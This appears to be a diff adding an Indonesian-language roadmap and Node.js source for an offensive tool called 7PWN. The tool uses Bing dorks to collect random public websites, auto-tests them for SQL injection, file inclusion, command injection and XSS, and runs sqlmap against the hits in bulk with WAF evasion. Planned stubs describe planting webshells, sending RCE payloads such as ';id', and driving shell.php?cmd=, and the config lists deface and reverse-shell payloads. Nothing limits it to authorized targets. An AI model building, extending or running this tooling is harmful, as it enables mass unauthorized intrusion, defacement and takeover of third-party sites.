@@ -1,0 +1,564 @@
+==================================================
+PETA JALAN (STEP) 7PWN UNIVERSAL FRAMEWORK v6.1.0
+==================================================
+Status Saat Ini: 
+- index.js (FINAL, TERKUNCI, tidak boleh diedit lagi)
+- Menus (recon, exploit, post, loot) sudah terhubung.
+- Modul SQLi & Deploy Shell sudah berjalan.
+
+LANGKAH SELANJUTNYA (SESUAI STEP):
+1. Isi core/path_analyzer.js (Logika auto-path INTO OUTFILE)
+2. Isi modules/exploit_rce.js (Logika Command Injection)
+3. Isi modules/shell_manager.js (Interaksi Webshell/RCE)
+4. Isi core/waf_evasion.js (Rotasi Proxy/Header)
+5. Isi wordlists & payloads yang kosong.
+==================================================
+
+
+=== [KODE] config.json ===
+{
+  "version": "6.1.0",
+  "author": "SevenByte",
+  "timeout": 10000,
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "threads": 5,
+  "dorking": {
+    "delay_between_pages_ms": 1500,
+    "delay_between_tests_ms": 1000
+  },
+  "paths": {
+    "wordlists": {
+      "sqli": "wordlists/sqli_payloads.txt",
+      "lfi": "wordlists/lfi_payloads.txt",
+      "rce": "wordlists/rce_payloads.txt",
+      "xss": "wordlists/xss_payloads.txt",
+      "shell_paths": "wordlists/shell_paths.txt"
+    },
+    "payloads": {
+      "webshell": "payloads/shell_minimal.php",
+      "deface": "payloads/deface.html",
+      "reverse_shell": "payloads/reverse_shell.txt"
+    },
+    "logs": "logs/",
+    "loot": "loot/",
+    "results": "results/"
+  },
+  "exploit": {
+    "sqlmap_path": "sqlmap",
+    "default_parameter": "id",
+    "use_proxy": false,
+    "proxy_url": "http://127.0.0.1:8080",
+    "tamper_scripts": ["space2comment", "randomcase"]
+  }
+}
+
+=== [KODE] core/utils.js ===
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+const config = require('../config.json');
+
+// 1. Membaca file payload dari wordlists
+function loadPayloads(type) {
+    let filePath = '';
+    
+    // Cek tipe payload berdasarkan config
+    if (type === 'sqli') filePath = config.paths.wordlists.sqli;
+    else if (type === 'lfi') filePath = config.paths.wordlists.lfi;
+    else if (type === 'rce') filePath = config.paths.wordlists.rce;
+    else if (type === 'xss') filePath = config.paths.wordlists.xss;
+    else if (type === 'shell_paths') filePath = config.paths.wordlists.shell_paths;
+    
+    if (!filePath || !fs.existsSync(filePath)) {
+        console.log(`[X] File wordlist tidak ditemukan: ${filePath}`);
+        return [];
+    }
+    
+    const content = fs.readFileSync(filePath, 'utf-8');
+    // Pisahkan per baris, buang baris kosong dan komentar (#)
+    return content.split('\n')
+        .map(line => line.trim())
+        .filter(line => line !== '' && !line.startsWith('#'));
+}
+
+// 2. Membaca file fisik (seperti Webshell) untuk di-deploy
+function readPayloadFile(filePath) {
+    if (!fs.existsSync(filePath)) {
+        console.log(`[X] File payload tidak ditemukan: ${filePath}`);
+        return null;
+    }
+    return fs.readFileSync(filePath, 'utf-8');
+}
+
+// 3. Generate Hash (untuk nama file log unik)
+function generateHash(text) {
+    return crypto.createHash('md5').update(text).digest('hex');
+}
+
+// 4. Logger ke file
+function logToFile(filename, text) {
+    const logDir = config.paths.logs;
+    if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
+    
+    const timestamp = new Date().toISOString();
+    fs.appendFileSync(path.join(logDir, filename), `[${timestamp}] ${text}\n`);
+}
+
+// 5. Fungsi Jeda (Delay)
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+module.exports = { loadPayloads, readPayloadFile, generateHash, logToFile, sleep };
+
+=== [KODE] core/engine.js ===
+const { spawn } = require('child_process');
+const axios = require('axios');
+const config = require('../config.json');
+
+// 1. Eksekusi command line (real-time output)
+function runCommand(command, args, options = {}) {
+    return new Promise((resolve, reject) => {
+        const child = spawn(command, args, options);
+        let output = '';
+        let errorOutput = '';
+
+        child.stdout.on('data', (data) => {
+            const text = data.toString();
+            output += text;
+            if (options.showOutput) {
+                process.stdout.write(`    ${text}`);
+            }
+        });
+
+        child.stderr.on('data', (data) => {
+            const text = data.toString();
+            errorOutput += text;
+            if (options.showOutput) {
+                process.stderr.write(`    [ERR] ${text}`);
+            }
+        });
+
+        child.on('close', (code) => {
+            resolve({ code, output, errorOutput });
+        });
+        
+        child.on('error', (err) => {
+            reject(err);
+        });
+    });
+}
+
+// 2. HTTP Request Universal (dengan bypass WAF header jika diaktifkan)
+async function httpRequest(url, method = 'GET', data = null, customHeaders = {}) {
+    const headers = {
+        'User-Agent': config.user_agent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        ...customHeaders
+    };
+
+    // Fitur Bypass WAF Sederhana (Header Spoofing)
+    if (config.waf && config.waf.bypass_headers) {
+        headers['X-Forwarded-For'] = '127.0.0.1';
+        headers['X-Originating-IP'] = '127.0.0.1';
+        headers['X-Remote-IP'] = '127.0.0.1';
+        headers['X-Remote-Addr'] = '127.0.0.1';
+    }
+
+    try {
+        const response = await axios({
+            method,
+            url,
+            data,
+            headers,
+            validateStatus: false, // Biarkan ambil status apapun (200, 403, 500)
+            timeout: config.timeout,
+            maxRedirects: 5
+        });
+        
+        return {
+            status: response.status,
+            headers: response.headers,
+            data: typeof response.data === 'string' ? response.data : JSON.stringify(response.data)
+        };
+    } catch (error) {
+        return {
+            status: 'ERROR',
+            headers: {},
+            data: error.message
+        };
+    }
+}
+
+module.exports = { runCommand, httpRequest };
+
+=== [KODE] modules/scanner.js ===
+const { httpRequest } = require('../core/engine');
+const { loadPayloads } = require('../core/utils');
+
+async function checkVulnerability(url) {
+    if (!url.includes('=')) return { isVulnerable: false, type: "No Parameters" };
+
+    // Parsing URL dengan API bawaan Node.js
+    let urlObj;
+    try {
+        urlObj = new URL(url);
+    } catch (e) {
+        return { isVulnerable: false, type: "Invalid URL" };
+    }
+
+    // Ambil parameter pertama yang ditemukan untuk diuji
+    const firstParam = urlObj.searchParams.keys().next().value;
+    if (!firstParam) return { isVulnerable: false, type: "No Parameters" };
+
+    // Simpan nilai asli, kita akan menggantinya dengan payload
+    const originalValue = urlObj.searchParams.get(firstParam);
+
+    // Helper untuk mengganti parameter
+    const buildTestUrl = (payload) => {
+        const newUrlObj = new URL(url);
+        newUrlObj.searchParams.set(firstParam, payload);
+        return newUrlObj.toString();
+    };
+
+    // 1. Uji SQL Injection
+    const sqliPayloads = loadPayloads('sqli');
+    for (const payload of sqliPayloads) {
+        const testUrl = buildTestUrl(originalValue + payload); // Tambahkan ' ke nilai asli
+        const res = await httpRequest(testUrl);
+        
+        const sqliRegex = /SQL syntax|mysql_fetch|Warning: mysqli|Unclosed quotation|PostgreSQL.*ERROR|ORA-[0-9]{5}/i;
+        if (sqliRegex.test(res.data)) {
+            return { isVulnerable: true, type: "SQL Injection (Error)", payload: payload };
+        }
+    }
+
+    // 2. Uji LFI (Mengganti nilai asli sepenuhnya)
+    const lfiPayloads = loadPayloads('lfi');
+    for (const payload of lfiPayloads) {
+        const testUrl = buildTestUrl(payload);
+        const res = await httpRequest(testUrl);
+        if (res.data.includes('root:x:0:0') || res.data.includes('[extensions]')) {
+            return { isVulnerable: true, type: "Local File Inclusion (LFI)", payload: payload };
+        }
+    }
+
+    // 3. Uji RCE (Mengganti nilai asli sepenuhnya)
+    const rcePayloads = loadPayloads('rce');
+    for (const payload of rcePayloads) {
+        const testUrl = buildTestUrl(payload);
+        const res = await httpRequest(testUrl);
+        if (res.data.includes('uid=') && res.data.includes('gid=')) {
+            return { isVulnerable: true, type: "Command Injection (RCE)", payload: payload };
+        }
+    }
+
+    // 4. Uji XSS (Mengganti nilai asli sepenuhnya)
+    const xssPayloads = loadPayloads('xss');
+    for (const payload of xssPayloads) {
+        const testUrl = buildTestUrl(payload);
+        const res = await httpRequest(testUrl);
+        // Cek apakah payload muncul mentah
+        if (res.data.includes(payload)) {
+            return { isVulnerable: true, type: "Reflected XSS", payload: payload };
+        }
+    }
+
+    return { isVulnerable: false, type: "Secure/Blocked" };
+}
+
+module.exports = { checkVulnerability };
+
+=== [KODE] modules/scraper.js ===
+const axios = require('axios');
+const cheerio = require('cheerio');
+const fs = require('fs');
+const config = require('../config.json');
+const { checkVulnerability } = require('./scanner');
+const { sleep, logToFile } = require('../core/utils');
+const inquirer = require('inquirer');
+
+// Fungsi untuk memuat URL yang sudah ada agar tidak duplikat
+function loadExistingTargets() {
+    if (!fs.existsSync('targets/list.txt')) return new Set();
+    const content = fs.readFileSync('targets/list.txt', 'utf-8');
+    const urls = new Set();
+    content.split('\n').forEach(line => {
+        if (line.trim() !== '') {
+            // Ambil URL sebelum tanda '|'
+            urls.add(line.split('|')[0]);
+        }
+    });
+    return urls;
+}
+
+async function scrapeAndValidate(dork, pages = 1) {
+    const urls = new Set();
+    const existingTargets = loadExistingTargets();
+    const vulnerableUrls = [];
+    
+    console.log(`\n[*] Memulai Dorking + Auto-Validasi...`);
+    console.log(`[*] Dork: "${dork}"`);
+    console.log(`[*] Mengambil ${pages} halaman...\n`);
+    
+    // FASE 1: SCRAPING
+    for (let i = 1; i <= pages; i++) {
+        try {
+            process.stdout.write(`    [+] Mengambil halaman ${i}... `);
+            // Rotasi Dork: Menambahkan kata kunci acak agar hasil selalu baru
+            const randomKeywords = ['shop', 'berita', 'toko', 'sekolah', 'layanan', 'product', 'news'];
+            const randomWord = randomKeywords[Math.floor(Math.random() * randomKeywords.length)];
+            const finalDork = `${dork} ${randomWord}`;
+
+            const response = await axios.get(`https://www.bing.com/search?q=${encodeURIComponent(finalDork)}&first=${(i - 1) * 10 + 1}`, {
+                headers: { 'User-Agent': config.user_agent, 'Accept-Language': 'en-US,en;q=0.9' },
+                timeout: config.timeout
+            });
+            
+            const $ = cheerio.load(response.data);
+            let foundInPage = 0;
+
+            $('a').each((index, element) => {
+                const href = $(element).attr('href');
+                if (href && href.startsWith('http') && !href.includes('bing.com') && !href.includes('microsoft.com') && href.includes('=')) {
+                    // Cek duplikat: Jika belum ada di list.txt dan belum ada di antrean halaman ini
+                    if (!existingTargets.has(href) && !urls.has(href)) {
+                        urls.add(href);
+                        foundInPage++;
+                    }
+                }
+            });
+
+            console.log(`[Dapat ${foundInPage} URL baru]`);
+            await sleep(config.dorking.delay_between_pages_ms); 
+        } catch (error) {
+            console.log(`[X] Error scraping: ${error.message}`);
+        }
+    }
+    
+    if (urls.size === 0) {
+        console.log(`\n[X] Tidak ada URL baru yang ditemukan (mungkin semua sudah ada di list.txt).`);
+        return [];
+    }
+
+    // FASE 2: VALIDASI
+    console.log(`\n[*] Menguji ${urls.size} URL untuk berbagai kerentanan...`);
+    let count = 0;
+    
+    for (const url of urls) {
+        count++;
+        process.stdout.write(`    [${count}/${urls.size}] Menguji: ${url.substring(0, 50)}... `);
+        
+        const result = await checkVulnerability(url);
+        
+        if (result.isVulnerable) {
+            console.log(`[VULNERABLE: ${result.type}]`);
+            vulnerableUrls.push({ url: url, type: result.type });
+            fs.appendFileSync('targets/list.txt', `${url}|${result.type}\n`);
+            logToFile('http_requests.log', `[VULN] ${result.type} found at ${url}`);
+        } else {
+            console.log(`[Aman]`);
+        }
+        await sleep(config.dorking.delay_between_tests_ms);
+    }
+
+    // FASE 3: RINGKASAN & AUTO-EXPLOIT PROMPT
+    if (vulnerableUrls.length > 0) {
+        console.log(`\n[V] SUKSES! ${vulnerableUrls.length} target rentan ditemukan.`);
+        
+        // FITUR BARU: Prompt Auto-Exploit
+        const { autoExploit } = await inquirer.prompt([
+            {
+                type: 'confirm',
+                name: 'autoExploit',
+                message: 'Langsung lakukan Auto-Exploit ke target yang baru ditemukan ini?',
+                default: false
+            }
+        ]);
+
+        if (autoExploit) {
+            // Kita panggil modul exploit (akan kita buat di fase selanjutnya)
+            console.log(`\n[*] Menyiapkan Auto-Exploit...`);
+            // return vulnerableUrls; // Modul index.js akan menangkap ini
+            return vulnerableUrls; 
+        }
+    } else {
+        console.log(`\n[X] Tidak ada target rentan yang ditemukan dari dork ini.`);
+    }
+
+    return vulnerableUrls;
+}
+
+module.exports = { scrapeAndValidate };
+
+=== [KODE] modules/exploiter.js ===
+const { spawn } = require('child_process');
+const fs = require('fs');
+const config = require('../config.json');
+
+async function runSqlmap(url, param, extraArgs = [], showOutput = true) {
+    return new Promise((resolve, reject) => {
+        const args = ['-u', url, '-p', param, '--batch', '--random-agent', ...extraArgs];
+        const child = spawn(config.exploit.sqlmap_path, args);
+        let output = '';
+
+        child.stdout.on('data', (data) => {
+            const text = data.toString();
+            output += text;
+            if (showOutput && (text.includes('[INFO]') || text.includes('[CRITICAL]'))) {
+                process.stdout.write(`    ${text}`);
+            }
+        });
+
+        child.on('close', (code) => {
+            resolve({ code, output });
+        });
+
+        child.on('error', (err) => reject(err));
+    });
+}
+
+module.exports = { runSqlmap };
+
+=== [KODE] modules/waf_bypasser.js ===
+const config = require('../config.json');
+
+// Fungsi untuk merotasi tamper script jika WAF memblokir
+function getBypassTamper() {
+    if (!config.waf || !config.waf.tamper_list || config.waf.tamper_list.length === 0) {
+        return '';
+    }
+    // Gabungkan tamper script dengan koma (format yang diminta sqlmap)
+    return config.waf.tamper_list.join(',');
+}
+
+// Fungsi untuk memanipulasi header (jika diperlukan di masa depan)
+function getBypassHeaders() {
+    if (config.waf && config.waf.bypass_headers) {
+        return {
+            'X-Forwarded-For': '127.0.0.1',
+            'X-Originating-IP': '127.0.0.1'
+        };
+    }
+    return {};
+}
+
+module.exports = { getBypassTamper, getBypassHeaders };
+
+=== [KODE] modules/exploit_sqli.js ===
+const fs = require('fs');
+const config = require('../config.json');
+const { runCommand } = require('../core/engine');
+const { generateHash, logToFile, sleep } = require('../core/utils');
+const chalk = require('chalk');
+
+async function exploitSQLi(targetUrl) {
+    const hash = generateHash(targetUrl);
+    const logFile = `logs/sqlmap_${hash}.log`;
+    
+    console.log(chalk.yellow(`\n[*] Menyiapkan SQLmap untuk: ${targetUrl}`));
+    
+    // Ambil parameter default dari config
+    const param = config.exploit.default_parameter || 'id';
+    
+    // Susun argumen sqlmap
+    const args = [
+        '-u', targetUrl,
+        '-p', param,
+        '--batch',
+        '--random-agent',
+        '--level=1',
+        '--risk=1',
+        '--tamper=' + config.exploit.tamper_scripts.join(',')
+    ];
+
+    // Jika menggunakan proxy (opsional)
+    if (config.exploit.use_proxy && config.exploit.proxy_url) {
+        args.push('--proxy', config.exploit.proxy_url);
+    }
+
+    console.log(chalk.gray(`    [*] Perintah: sqlmap ${args.join(' ')}`));
+    console.log(chalk.gray(`    [*] Menunggu output...\n`));
+
+    try {
+        // Jalankan sqlmap secara real-time (showOutput: true)
+        const result = await runCommand(config.exploit.sqlmap_path, args, { showOutput: true });
+        
+        // Simpan log ke file
+        fs.writeFileSync(logFile, result.output);
+        logToFile('http_requests.log', `Exploited SQLi on ${targetUrl}. Exit code: ${result.code}`);
+
+        // Analisis hasil
+        if (result.output.includes('is vulnerable')) {
+            console.log(chalk.green(`\n[V] SUKSES! ${targetUrl} TERKONFIRMASI SQLi.`));
+            console.log(chalk.gray(`    Log disimpan di: ${logFile}`));
+            
+            // (Backlog) Di sini kita bisa otomatis memanggil shell_deployer
+            // untuk menanam webshell.
+            return true;
+        } else {
+            console.log(chalk.red(`\n[X] GAGAL. ${targetUrl} tidak rentan atau terblokir WAF.`));
+            return false;
+        }
+        
+    } catch (error) {
+        console.log(chalk.red(`\n[X] Error eksekusi sqlmap: ${error.message}`));
+        return false;
+    }
+}
+
+// Fungsi utama yang dipanggil oleh Menu
+async function autoExploitSQLi() {
+    const listFile = 'targets/list.txt';
+    if (!fs.existsSync(listFile)) {
+        console.log(chalk.red('\n[X] File targets/list.txt tidak ditemukan. Lakukan Scan dulu.'));
+        return;
+    }
+
+    // Baca list dan filter hanya yang SQLi
+    const lines = fs.readFileSync(listFile, 'utf-8').split('\n').filter(l => l.trim() !== '');
+    const sqliTargets = [];
+
+    lines.forEach(line => {
+        const [url, type] = line.split('|');
+        if (type && type.includes('SQL Injection')) {
+            sqliTargets.push(url);
+        }
+    });
+
+    if (sqliTargets.length === 0) {
+        console.log(chalk.yellow('\n[!] Tidak ada target SQL Injection yang ditemukan di targets/list.txt.'));
+        return;
+    }
+
+    console.log(chalk.cyan(`\n[*] Ditemukan ${sqliTargets.length} target SQLi. Memulai Auto-Exploit...`));
+    
+    let successCount = 0;
+    for (let i = 0; i < sqliTargets.length; i++) {
+        console.log(chalk.magenta(`\n=========================================`));
+        console.log(chalk.magenta(`[Target ${i + 1}/${sqliTargets.length}]`));
+        console.log(chalk.magenta(`=========================================`));
+        
+        const success = await exploitSQLi(sqliTargets[i]);
+        if (success) successCount++;
+        
+        // Jeda antar target agar tidak terlalu agresif
+        await sleep(2000);
+    }
+
+    console.log(chalk.green(`\n[*] Auto-Exploit Selesai. ${successCount}/${sqliTargets.length} target berhasil dieksploitasi.`));
+}
+
+module.exports = { autoExploitSQLi, exploitSQLi };
+
+=== [KOSONG] core/path_analyzer.js ===
+Logika: Mencari tahu Document Root web server (seperti /var/www/html) menggunakan SQLi (LOAD_FILE atau @@datadir) sebelum menanam shell.
+
+
+=== [KOSONG] modules/exploit_rce.js ===
+Logika: Mengirim payload RCE (seperti ;id atau |whoami) ke parameter yang rentan dan membaca output perintah di response HTTP.
+
+
+=== [KOSONG] modules/shell_manager.js ===
+Logika: Memberikan interface terminal interaktif untuk mengirim perintah ke webshell (shell.php?cmd=...) yang sudah ditanam.
